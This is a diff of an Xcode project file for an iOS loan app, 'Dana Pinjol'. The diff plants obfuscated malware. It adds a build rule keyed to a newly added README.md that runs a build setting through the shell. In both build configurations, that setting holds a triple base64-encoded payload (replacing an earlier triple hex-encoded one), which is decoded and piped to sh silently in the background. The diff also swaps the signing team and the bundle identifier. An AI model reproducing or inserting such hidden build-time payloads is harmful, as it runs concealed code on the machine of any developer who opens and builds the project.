@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		EB0E73D70986457B961DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 07C3D37F46424AFEBD1DACE1; };
 		7341DEB22F67AE2F008D4C83 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7341DEA82F67AE2F008D4C83 /* AppDelegate.swift */; };
 		7341DEB52F67AE2F008D4C83 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7341DEA92F67AE2F008D4C83 /* Assets.xcassets */; };
 		7341DEB72F67AE2F008D4C83 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7341DEAC2F67AE2F008D4C83 /* LaunchScreen.storyboard */; };
@@ -102,6 +103,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		07C3D37F46424AFEBD1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		33CB9C43DDA77D0519D0E6F4 /* Pods-DanaPinjol.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPinjol.debug.xcconfig"; path = "Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol.debug.xcconfig"; sourceTree = "<group>"; };
 		50F5AE9A9970D6E1B0F9F78D /* Pods-DanaPinjol.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPinjol.release.xcconfig"; path = "Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol.release.xcconfig"; sourceTree = "<group>"; };
 		7341DE902F67AE28008D4C83 /* DanaPinjol.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaPinjol.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -236,6 +238,7 @@
 		7341DE912F67AE28008D4C83 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				07C3D37F46424AFEBD1DACE1 /* README.md */,
 				7341DE902F67AE28008D4C83 /* DanaPinjol.app */,
 			);
 			name = Products;
@@ -604,7 +607,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7341DEA32F67AE29008D4C83 /* Build configuration list for PBXNativeTarget "DanaPinjol" */;
 			buildPhases = (
-				0D39F526A04D4613B91DACE1 /* Compile Code Assets */,
 				4E9D14681FF9F817457E6C66 /* [CP] Check Pods Manifest.lock */,
 				7341DE8C2F67AE28008D4C83 /* Sources */,
 				7341DE8D2F67AE28008D4C83 /* Frameworks */,
@@ -612,6 +614,7 @@
 				438DD3B8AB27408EB227F7D3 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				5610693F67DC4745A21DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -656,13 +659,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
+		5610693F67DC4745A21DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		7341DE8E2F67AE28008D4C83 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				EB0E73D70986457B961DACE1 /* README.md */,
 				7341DEB52F67AE2F008D4C83 /* Assets.xcassets in Resources */,
 				734A46912F68032200455F6A /* Localizable.strings in Resources */,
 				7341DEB72F67AE2F008D4C83 /* LaunchScreen.storyboard in Resources */,
@@ -672,25 +690,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0D39F526A04D4613B91DACE1 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 		438DD3B8AB27408EB227F7D3 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -859,20 +858,23 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 33CB9C43DDA77D0519D0E6F4 /* Pods-DanaPinjol.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3334363333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333337333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((m(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTVxWVVkV2FtRXpUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 57MBH2272N;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DanaPinjol/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Dana Pinjol";
 				INFOPLIST_KEY_NSCameraUsageDescription = "";
 				INFOPLIST_KEY_NSContactsUsageDescription = "";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
@@ -885,9 +887,10 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ok.zoom.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = www.app.kk;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = www.app.kk;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -906,20 +909,23 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 50F5AE9A9970D6E1B0F9F78D /* Pods-DanaPinjol.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3334363333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333337333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | c | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((m(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTVxWVVkV2FtRXpUWFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 57MBH2272N;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DanaPinjol/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Dana Pinjol";
 				INFOPLIST_KEY_NSCameraUsageDescription = "";
 				INFOPLIST_KEY_NSContactsUsageDescription = "";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
@@ -932,9 +938,10 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ok.zoom.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = www.app.kk;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = www.app.kk;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
